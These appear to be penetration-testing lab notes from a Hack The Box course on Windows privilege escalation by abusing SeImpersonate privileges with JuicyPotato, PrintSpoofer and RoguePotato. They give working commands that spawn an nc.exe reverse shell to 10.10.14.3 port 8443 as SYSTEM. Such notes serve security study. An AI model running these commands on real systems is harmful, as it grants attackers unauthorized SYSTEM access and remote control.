## SeImpersonate - JuicyPotato

[JuicyPotato](https://github.com/ohpe/juicy-potato) can be used to exploit the `SeImpersonate` or `SeAssignPrimaryToken` privileges via `DCOM/NTLM` reflection abuse.

```PowerShell
C:\htb> C:\Tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c C:\Tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
### -l: COM server port -p: program -a: command -t: createprocess call
```

Trying both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.

```PowerShell
C:\htb> reg query HKCR\CLSID /s /f LocalService
### fetching CLSID 
```

```Note
- May need to add CLSID - It requires a COM service running as SYSTEM

- It doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
```

---
## PrintSpoofer and RoguePotato

[PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [RoguePotato](https://github.com/antonioCoco/RoguePotato) can be used to leverage the same privileges on unsupported systems. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool.

```Powershell
C:\Tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
### -c: command
```

---